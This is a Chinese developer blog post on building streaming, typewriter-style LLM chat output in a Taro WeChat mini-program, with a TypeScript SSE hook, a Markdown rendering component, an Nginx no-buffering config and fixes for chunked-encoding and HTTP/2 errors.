.task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近大模型（LLM）可以说是火得一塌糊涂。各家公司都在往小程序里塞 AI 对话功能。但是，大家有没有发现一个问题？如果你像传统请求那样，等 AI 把几千字的小作文全写完再返回给前端，用户的等待体验简直是灾难级的！😫</p>
<p>所以，<strong>流式输出（Streaming）</strong> 也就是我们常说的“打字机效果”，是提升 AI 产品体验的必杀技。</p>
<p>今天，我就带大家深入硬核地扒一扒，如何在 <strong>Taro 框架</strong> 下，利用 <strong>微信小程序原生能力</strong> 实现丝滑的 SSE（Server-Sent Events）流式响应。</p>
<p>如果你在实施的过程中遇到这些问题：</p>
<ul>
<li>明明代码按官方写的但是就是不流式输出？</li>
<li>模拟器跟真机效果不一样？</li>
<li>为什么安卓可以。IOS却不行</li>
<li>为什么可以输出内容但是控制台总是会在请求结束后报错</li>
</ul>
<p>那么请放心，这中间的坑，我已经替大家踩平了</p>
<h2 data-id="heading-0">🧐 为什么是 SSE 而不是 WebSocket？</h2>
<p>虽然 WebSocket 全双工很强，但对于大模型对话这种“一问多答”的场景，SSE（Server-Sent Events）其实更轻量、更符合 HTTP 语义。</p>
<p>但在微信小程序里，我们并没有标准的 <code>EventSource</code> API。不过别慌，微信的 <code>wx.request</code>（Taro 中是 <code>Taro.request</code>）支持了 <code>enableChunked</code> 参数。</p>
<p>这就给了我们操作的空间！😏</p>
<h2 data-id="heading-1">🛠️ 核心技术实现：前端篇</h2>
<p>我们先来看核心的 Hook 实现。这里我封装了一个 <code>useSSE</code>，它负责建立连接、解码二进制流、解析 SSE 协议以及控制打字机速度。</p>
<h3 data-id="heading-2">1. 链路设计图</h3>
<p>在开始贴代码前，先看下数据是怎么流转的：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A["用户发起对话"] --&gt; B["Taro.request (开启 enableChunked)"]
    B --"建立连接"--&gt; C["服务端响应 (Transfer-Encoding: chunked)"]
    C --"二进制流 chunk"--&gt; D["onChunkReceived 监听"]
    D --&gt; E["TextDecoder 解码 (ArrayBuffer 转 String)"]
    E --&gt; F["SSE 协议解析 (提取 data 字段)"]
    F --&gt; G["写入缓存队列 (Buffer)"]
    G --&gt; H["定时器控制 (打字机效果)"]
    H --&gt; I["更新 UI (Markdown 渲染)"]
</code></pre>
<h3 data-id="heading-3">2. 核心 Hook：<code>useSSE.ts</code></h3>
<p>这个文件是整个功能的灵魂。我们需要解决两个大难题：</p>
<ol>
<li><strong>解码</strong>：小程序返回的是 <code>ArrayBuffer</code>，需要兼容性好的解码方案（推荐 <code>text-encoding-shim</code>）。</li>
<li><strong>粘包处理</strong>：网络传输是不讲道理的，可能一次给你半条数据，也可能一次给你三条。必须要有 Buffer 机制。</li>
</ol>
<p>直接上代码，CV 也就是复制粘贴就能用：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Taro</span>, { <span class="hljs-title class_">RequestTask</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tarojs/taro'</span>
<span class="hljs-keyword">import</span> { useState, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-comment">// 假设 config 和 request 是你项目里的基础配置，需根据实际情况替换</span>
<span class="hljs-keyword">import</span> { apiUrl } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/config'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ResChatMessagesDTO</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/request'</span>
<span class="hljs-keyword">import</span> { getAuthorization } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/utils/authorization'</span>
<span class="hljs-comment">// 这是一个非常重要的库，用于在小程序环境解码 Uint8Array</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">TextEncoding</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'text-encoding-shim'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">ChatMessage</span> = <span class="hljs-title class_">Omit</span>&lt;<span class="hljs-title class_">ResChatMessagesDTO</span>, <span class="hljs-string">'id'</span>&gt; &amp; { id?: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> }

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useSSE</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 最终展示在 UI 上的内容（经过打字机效果处理）</span>
  <span class="hljs-keyword">const</span> [displayContent, setDisplayContent] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>)
  <span class="hljs-comment">// 完整的内容（后台实时接收到的）</span>
  <span class="hljs-keyword">const</span> [content, setContent] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>)
  
  <span class="hljs-comment">// 缓冲池，用于平滑打字机效果</span>
  <span class="hljs-keyword">const</span> bufferRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-string">''</span>)
  <span class="hljs-keyword">const</span> typingTimerRef = useRef&lt;<span class="hljs-built_in">any</span>&gt;(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> typingSpeedRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">120</span>) <span class="hljs-comment">// 打字速度 ms</span>
  <span class="hljs-keyword">const</span> typingStepRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">1</span>)    <span class="hljs-comment">// 每次渲染字符数</span>
  
  <span class="hljs-keyword">let</span> <span class="hljs-attr">requestTask</span>: <span class="hljs-title class_">RequestTask</span>&lt;<span class="hljs-built_in">any</span>&gt; | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>

  <span class="hljs-comment">/**
   * 将接收到的片段追加到缓冲池，并启动打字机
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">appendChunk</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">if</span> (!text) <span class="hljs-keyword">return</span>
    bufferRef.<span class="hljs-property">current</span> += text
    <span class="hljs-title function_">setContent</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> prev + text)
    
    <span class="hljs-comment">// 如果没有定时器在跑，就启动一个</span>
    <span class="hljs-keyword">if</span> (!typingTimerRef.<span class="hljs-property">current</span>) {
      <span class="hljs-keyword">const</span> msPerChar = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">10</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-number">1000</span> / typingSpeedRef.<span class="hljs-property">current</span>))
      typingTimerRef.<span class="hljs-property">current</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">if</span> (!bufferRef.<span class="hljs-property">current</span>) {
          <span class="hljs-keyword">return</span>
        }
        <span class="hljs-keyword">const</span> step = typingStepRef.<span class="hljs-property">current</span>
        <span class="hljs-comment">// 从缓冲池头部切出字符</span>
        <span class="hljs-keyword">const</span> take = bufferRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, step)
        bufferRef.<span class="hljs-property">current</span> = bufferRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">slice</span>(step)
        <span class="hljs-title function_">setDisplayContent</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> prev + take)
      }, msPerChar)
    }
  }

  <span class="hljs-comment">/**
   * 动态调整打字机速度（可选）
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">setTyping</span>(<span class="hljs-params">opts: { speed?: <span class="hljs-built_in">number</span>; step?: <span class="hljs-built_in">number</span> } = {}</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> opts.<span class="hljs-property">speed</span> === <span class="hljs-string">'number'</span> &amp;&amp; opts.<span class="hljs-property">speed</span> &gt; <span class="hljs-number">0</span>) {
      typingSpeedRef.<span class="hljs-property">current</span> = opts.<span class="hljs-property">speed</span>
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> opts.<span class="hljs-property">step</span> === <span class="hljs-string">'number'</span> &amp;&amp; opts.<span class="hljs-property">step</span> &gt; <span class="hljs-number">0</span>) {
      typingStepRef.<span class="hljs-property">current</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">1</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(opts.<span class="hljs-property">step</span>))
    }
    <span class="hljs-comment">// 重置定时器逻辑略...（参考完整代码）</span>
  }

  <span class="hljs-comment">/**
   * 发起对话请求
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">params: ChatMessage</span>) {
    <span class="hljs-keyword">const</span> url = apiUrl + <span class="hljs-string">'/api/web/member/v1/pets/stream/chat'</span>
    <span class="hljs-keyword">const</span> header = {
      <span class="hljs-title class_">Authorization</span>: <span class="hljs-title function_">getAuthorization</span>(),
      <span class="hljs-title class_">Accept</span>: <span class="hljs-string">'text/event-stream'</span>, <span class="hljs-comment">// 告诉服务端我要流</span>
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
    }

    <span class="hljs-keyword">let</span> buffer = <span class="hljs-string">''</span> <span class="hljs-comment">// 用于处理 SSE 分包/粘包的局部 buffer</span>

    <span class="hljs-comment">// 解码器：ArrayBuffer -&gt; String</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">arr: <span class="hljs-built_in">ArrayBuffer</span> | <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> arr === <span class="hljs-string">'string'</span>) <span class="hljs-keyword">return</span> arr
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> uint8Array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(arr)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoding</span>.<span class="hljs-title class_">TextDecoder</span>(<span class="hljs-string">'utf-8'</span>).<span class="hljs-title function_">decode</span>(uint8Array)
      } <span class="hljs-keyword">catch</span> (e) {
        <span class="hljs-comment">// 降级处理</span>
        <span class="hljs-keyword">const</span> ints = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(arr)
        <span class="hljs-keyword">let</span> str = <span class="hljs-string">''</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; ints.<span class="hljs-property">length</span>; i++) {
          str += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(ints[i])
        }
        <span class="hljs-keyword">return</span> str
      }
    }

    <span class="hljs-comment">// SSE 协议解析器</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">parseSSE</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span>[] {
      buffer += text
      <span class="hljs-comment">// SSE 消息通常以 \n\n 结尾</span>
      <span class="hljs-keyword">const</span> blocks = buffer.<span class="hljs-title function_">split</span>(<span class="hljs-string">'\n\n'</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">b</span>) =&gt;</span> b.<span class="hljs-title function_">trim</span>().<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>)
      
      <span class="hljs-comment">// 如果最后一个块不是以 \n\n 结尾，说明数据没传完，放回 buffer 等待下一次</span>
      <span class="hljs-keyword">if</span> (!buffer.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'\n\n'</span>) &amp;&amp; blocks.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        buffer = blocks.<span class="hljs-title function_">pop</span>() || <span class="hljs-string">''</span>
      } <span class="hljs-keyword">else</span> {
        buffer = <span class="hljs-string">''</span>
      }
      
      <span class="hljs-keyword">const</span> <span class="hljs-attr">out</span>: <span class="hljs-built_in">string</span>[] = []
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> blk <span class="hljs-keyword">of</span> blocks) {
        <span class="hljs-keyword">const</span> lines = blk.<span class="hljs-title function_">split</span>(<span class="hljs-string">'\n'</span>)
        <span class="hljs-comment">// 提取 data: 开头的数据</span>
        <span class="hljs-keyword">const</span> dataLines = lines.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">l</span>) =&gt;</span> l.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'data:'</span>))
        <span class="hljs-keyword">if</span> (dataLines.<span class="hljs-property">length</span>) {
          <span class="hljs-keyword">const</span> payload = dataLines.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">l</span>) =&gt;</span> l.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^data:\s*/</span>, <span class="hljs-string">''</span>)).<span class="hljs-title function_">join</span>(<span class="hljs-string">'  \n'</span>)
          out.<span class="hljs-title function_">push</span>(payload)
        }
      }
      <span class="hljs-keyword">return</span> out
    }

    <span class="hljs-comment">// 🚀 核心请求逻辑</span>
    requestTask = <span class="hljs-title class_">Taro</span>.<span class="hljs-title function_">request</span>({
      url,
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      header,
      <span class="hljs-attr">data</span>: params,
      <span class="hljs-attr">enableChunked</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 👈 开启分块传输，关键！</span>
      <span class="hljs-attr">responseType</span>: <span class="hljs-string">'arraybuffer'</span>, <span class="hljs-comment">// 👈 必须接收二进制，否则中文乱码</span>
      <span class="hljs-attr">enableHttp2</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 👈 避免 HTTP/2 协议报错，后面会细说</span>
      <span class="hljs-attr">timeout</span>: <span class="hljs-number">60000</span>,
      <span class="hljs-attr">success</span>: <span class="hljs-function">() =&gt;</span> {},
      <span class="hljs-attr">fail</span>: <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'请求错误'</span>, err),
      <span class="hljs-attr">complete</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'请求完成'</span>)
    })

    requestTask.<span class="hljs-title function_">onHeadersReceived</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'连接成功'</span>))
    
    <span class="hljs-comment">// 监听数据包</span>
    requestTask.<span class="hljs-title function_">onChunkReceived</span>(<span class="hljs-function">(<span class="hljs-params">res: { data: <span class="hljs-built_in">ArrayBuffer</span> }</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> text = <span class="hljs-title function_">decode</span>(res.<span class="hljs-property">data</span>)
      <span class="hljs-keyword">const</span> msgs = <span class="hljs-title function_">parseSSE</span>(text)
      
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> chunk <span class="hljs-keyword">of</span> msgs) {
        <span class="hljs-comment">// 这里可以做一些特殊的字符处理，比如 markdown 的处理</span>
        <span class="hljs-keyword">const</span> _chunk = <span class="hljs-title class_">String</span>(chunk).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(#+)/</span>, <span class="hljs-string">'$1 '</span>)
        <span class="hljs-title function_">appendChunk</span>(_chunk)
      }
    })
  }

  <span class="hljs-keyword">return</span> {
    chat,
    <span class="hljs-attr">close</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (requestTask) {
        requestTask.<span class="hljs-title function_">abort</span>()
        requestTask = <span class="hljs-literal">null</span>
      }
      <span class="hljs-comment">// 清理定时器逻辑...</span>
    },
    content,
    displayContent, <span class="hljs-comment">// UI 绑定这个</span>
    setTyping
  }
}
</code></pre>
<h3 data-id="heading-4">3. UI 组件实现：Markdown 渲染 + 光标动画</h3>
<p>前端展示不仅要流式出字，还得支持 Markdown（代码高亮、表格等）。小程序里推荐使用 <code>towxml</code> 或类似的库。同时，为了拟真，我们加个闪烁的光标。</p>
<p><code>index.tsx</code>:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { memo, <span class="hljs-variable constant_">FC</span>, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">View</span>, <span class="hljs-title class_">Text</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tarojs/components'</span>
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./index.module.less'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChatMessage</span>, useSSE } <span class="hljs-keyword">from</span> <span class="hljs-string">'../../useSSE'</span>
<span class="hljs-comment">// 假设你引入了 towxml 组件</span>
<span class="hljs-keyword">import</span> towxmlFun <span class="hljs-keyword">from</span> <span class="hljs-string">'../../../../../components/towxml'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">MMLoading</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@wmeimob/taro-design'</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IStreamMessasgeProps</span> {
  <span class="hljs-attr">params</span>: <span class="hljs-title class_">ChatMessage</span>
  showTip?: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">Component</span>: <span class="hljs-variable constant_">FC</span>&lt;<span class="hljs-title class_">IStreamMessasgeProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { params, showTip = <span class="hljs-literal">true</span> } = props
  <span class="hljs-keyword">const</span> { chat, displayContent } = <span class="hljs-title function_">useSSE</span>()

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">chat</span>(params)
  }, [])

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.chatItem_ai}</span>&gt;</span>
      {!displayContent ? (
        // 思考时的 Loading 状态
        <span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.ai_loading}</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Text</span>&gt;</span>AI 正在疯狂烧脑中...<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">MMLoading</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span>
      ) : (
        <span class="hljs-tag">&lt;&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.aiBubble}</span>&gt;</span>
            {/* Markdown 渲染区域 */}
            <span class="hljs-tag">&lt;<span class="hljs-name">towxml</span> <span class="hljs-attr">nodes</span>=<span class="hljs-string">{towxmlFun(displayContent,</span> '<span class="hljs-attr">markdown</span>')} /&gt;</span>
            {/* 模拟光标 */}
            <span class="hljs-tag">&lt;<span class="hljs-name">View</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.cursor}</span> /&gt;</span> 
          <span class="hljs-tag">&lt;/<span class="hljs-name">View</span>&gt;</span>
          {showTip &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">Text</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.aiTitle}</span>&gt;</span>回答由AI生成，仅供参考备份<span class="hljs-tag">&lt;/<span class="hljs-name">Text</span>&gt;</span>}
        <span class="hljs-tag">&lt;/&gt;</span></span>
      )}
    &lt;/<span class="hljs-title class_">View</span>&gt;
  )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">memo</span>(<span class="hljs-title class_">Component</span>)
</code></pre>
<p><code>index.module.less</code> (光标动画):</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.cursor</span> {
  <span class="hljs-attribute">display</span>: inline-block;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">6px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">2px</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#333</span>;
  <span class="hljs-attribute">vertical-align</span>: bottom;
  <span class="hljs-attribute">animation</span>: blink <span class="hljs-number">1s</span> step-start infinite;
}

<span class="hljs-keyword">@keyframes</span> blink {
  <span class="hljs-number">50%</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  }
}
</code></pre>
<h2 data-id="heading-5">🌩️ 服务端配置：Nginx 的那些坑</h2>
<p>很多同学前端代码写得完美无缺，一跑起来：<strong>要么卡顿，要么报错，要么干脆不流式直接返回一坨数据。</strong></p>
<p>这锅通常得 Nginx 背。🙅‍♂️</p>
<p>Nginx 默认会开启缓冲（Buffering），它想存够一波数据再发给客户端，这直接把我们的“流”给截断了。</p>
<h3 data-id="heading-6">1. 黄金 Nginx 配置</h3>
<p>请把这段配置焊死在你的 Nginx 配置文件里：</p>
<pre><code class="hljs language-ini" lang="ini">location /api/web/member/v1/pets/stream/chat {
    <span class="hljs-comment"># 1. 关键：关闭所有缓冲</span>
    proxy_buffering off<span class="hljs-comment">;</span>
    proxy_cache off<span class="hljs-comment">;</span>
    proxy_request_buffering off<span class="hljs-comment">;</span>
    
    <span class="hljs-comment"># 2. 禁用 gzip 压缩 (压缩需要缓冲区，会破坏流式)</span>
    gzip off<span class="hljs-comment">;</span>

    <span class="hljs-comment"># 3. HTTP 协议设置</span>
    proxy_http_version 1.1<span class="hljs-comment">;</span>
    proxy_set_header Connection ''<span class="hljs-comment">; # 清空 Connection 头，保持长连接</span>

    <span class="hljs-comment"># 4. 编码设置</span>
    chunked_transfer_encoding on<span class="hljs-comment">;</span>
    
    <span class="hljs-comment"># 5. 禁用 Nginx 的加速缓冲 (X-Accel-Buffering)</span>
    proxy_set_header X-Accel-Buffering no<span class="hljs-comment">;</span>
    proxy_hide_header X-Accel-Buffering<span class="hljs-comment">;</span>
    
    <span class="hljs-comment"># 6. 超时设置 (流式响应通常时间较长)</span>
    proxy_read_timeout 24h<span class="hljs-comment">;</span>
    proxy_send_timeout 24h<span class="hljs-comment">;</span>

    <span class="hljs-comment"># 7. 响应头处理</span>
    add_header Cache-Control "no-cache"<span class="hljs-comment">;</span>
    add_header X-Accel-Buffering "no"<span class="hljs-comment">;</span>
    
    <span class="hljs-comment"># 8. 强制小缓冲区 (避免 Nginx 自作主张存数据)</span>
    proxy_buffer_size 1k<span class="hljs-comment">;</span>
    proxy_buffers 4 1k<span class="hljs-comment">;</span>
    proxy_busy_buffers_size 1k<span class="hljs-comment">;</span>
    
    <span class="hljs-comment"># 转发到你的后端服务...</span>
    proxy_pass http://backend_service<span class="hljs-comment">;</span>
}
</code></pre>
<h2 data-id="heading-7">🐛 常见报错与神坑排查</h2>
<p>在开发过程中，你可能会遇到下面这两个“顶级”错误，我都碰到过，这里直接给解法。</p>
<h3 data-id="heading-8">❌ 错误 1: <code>net::ERR_INCOMPLETE_CHUNKED_ENCODING</code></h3>
<p><strong>现象</strong>： 控制台报错 <code>POST net::ERR_INCOMPLETE_CHUNKED_ENCODING 200</code>。虽然状态码是 200，数据也收到了，但就是红一片。</p>
<p><strong>原因</strong>： 这是因为服务端告诉客户端 <code>Transfer-Encoding: chunked</code>，但在流结束时，没有发送标准的终止块（<code>0\r\n\r\n</code>），或者中间代理（比如公司网关、WAF）提前把连接切断了。</p>
<p><strong>解法</strong>：</p>
<ol>
<li>检查后端代码，确保流结束时正确关闭了 Writer。</li>
<li>如果在开发工具里看到这个，只要数据接收完整，<strong>可以忽略</strong>。这往往是开发工具对连接关闭状态的误判。</li>
</ol>
<h3 data-id="heading-9">❌ 错误 2: <code>net::ERR_HTTP2_PROTOCOL_ERROR</code></h3>
<p><strong>现象</strong>： 流式传输过程中，随机中断，报错 <code>net::ERR_HTTP2_PROTOCOL_ERROR</code>。</p>
<p><strong>硬核分析</strong>： 这是微信小程序网络栈在 <strong>HTTP/2</strong> 下处理 <strong>Chunked 响应</strong> 的已知不稳定点。当你的域名开启了 HTTP/2，且使用了 <code>wx.request</code> + <code>enableChunked</code> 时，微信客户端底层在处理分块时极其容易崩溃。</p>
<p><strong>终极解法</strong>： <strong>降级到 HTTP/1.1</strong>。</p>
<p>这就是为什么我在前端代码里写了 <code>enableHttp2: false</code>：</p>
<pre><code class="hljs language-arduino" lang="arduino">requestTask = Taro.<span class="hljs-built_in">request</span>({
  <span class="hljs-comment">// ... 其他配置</span>
  enableHttp2: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 👈 救命稻草</span>
})
</code></pre>
<p><strong>注意</strong>：有时候前端设置 <code>enableHttp2: false</code> 还不够，因为微信底层可能还是会复用之前的 H2 连接。最稳妥的方式是 <strong>服务端针对该流式接口强制只走 HTTP/1.1</strong>，或者干脆把流式接口挂载到一个没有开启 H2 的子域名下。</p>
<h2 data-id="heading-10">📝 总结</h2>
<p>在小程序里做大模型流式输出，其实就是一场 <strong>“前端 + 网络 + 后端”</strong> 的综合战役。</p>
<ol>
<li><strong>前端</strong>：Taro + <code>enableChunked</code> 是基础，TextDecoder + Buffer 队列是核心。</li>
<li><strong>体验</strong>：不要直接渲染，用定时器做个缓冲池，模拟“打字机”效果，丝滑度提升 10 倍。</li>
<li><strong>后端</strong>：Nginx 必须关闭 Buffering，否则流式变阻塞。</li>
<li><strong>避坑</strong>：HTTP/2 是流式的大敌，遇到诡异断连，请果断切回 HTTP/1.1。</li>
</ol>
<p>希望这篇文章能帮你少掉几根头发！如果你觉得有用，<strong>点赞、收藏、转发</strong> 三连走起！🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WXT 框架下的 Window 对象获取]]></title>    <link>https://juejin.cn/post/7575469988737007625</link>    <guid>https://juejin.cn/post/7575469988737007625</guid>    <pubDate>2025-11-24T01:24:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575469988737007625" data-draft-id="7575182522411302950" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WXT 框架下的 Window 对象获取"/> <meta itemprop="keywords" content="前端,浏览器"/> <meta itemprop="datePublished" content="2025-11-24T01:24:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="实习生小黄"/> <meta itemprop="url" content="https://juejin.cn/user/3246201392868637"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WXT 框架下的 Window 对象获取
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3246201392868637/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    实习生小黄
